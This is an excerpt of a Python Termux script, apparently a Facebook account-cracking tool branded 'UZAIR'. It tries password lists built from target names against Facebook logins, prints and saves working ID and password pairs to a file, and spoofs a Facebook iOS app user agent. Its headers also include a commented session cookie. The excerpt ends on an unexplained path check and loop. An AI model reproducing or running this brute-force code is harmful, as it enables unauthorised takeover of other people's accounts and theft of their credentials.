...
logo= f'''
\033[0;91m__    __  ________   ______   ______  _______  
\033[0;91m/  |  /  |/        | /      \ /      |/       \ 
\033[0;91m$$ |  $$ |$$$$$$$$/ /$$$$$$  |$$$$$$/ $$$$$$$  |
\033[0;94m$$ |  $$ |    /$$/  $$ |__$$ |  $$ |  $$ |__$$ |
\033[0;94m$$ |  $$ |   /$$/   $$    $$ |  $$ |  $$    $$< 
\033[0;94m$$ |  $$ |  /$$/    $$$$$$$$ |  $$ |  $$$$$$$  |
\033[0;95m$$ \__$$ | /$$/____ $$ |  $$ | _$$ |_ $$ |  $$ |
\033[0;95m$$    $$/ /$$      |$$ |  $$ |/ $$   |$$ |  $$ |
\033[0;95m$$$$$$/  $$$$$$$$/ $$/   $$/ $$$$$$/ $$/   $$/ 
                                                                                                
{50*"-"}
    Tool Version :     0.4
    Facebook  :     Muhammad Uzair
{50*"-"}'''
...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+923074980908?text={bumper}")
                        qsbuy()
...
def main():
        ...
        print('[2] Best Pass Lists \033[0;97m')
        ...
        if menu_opt =='1':
                ...
                os.system('xdg-open https://github.com/UzairSiyaalWrites/Broken.git')
...
def login():
    ...
    # 'cookie': 'datr=GkPlY9H2RJk-Li5JLsi0HfYB; sb=GkPlY4zmGky4iH0yWZsXpjNl; dnonce=AWmtGDY5VYliGN0zYwMMaaZ6sYx-VyYzr0aWKgvktfqk2WA3nZenG4Z5u7vb_N3cp7IxgsHTSZxn5LO57tKrDqSz; fr=0P9DBEIZSfNdNu8Bu..Bj5UMg.oo.AAA.0.0.Bj5USS.AWWv9nfFHmI',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 [FBAN/FBIOS;FBAV/210.0.0.37.117;FBBV/143754374;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/3;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;',
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[UZAIR] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[UZAIR-OK] '+roid+' | '+pas+'\033[0;97m')
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/UZAIR_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/UZAIR' in datar:
        pass
else:
        for i in range(5000):
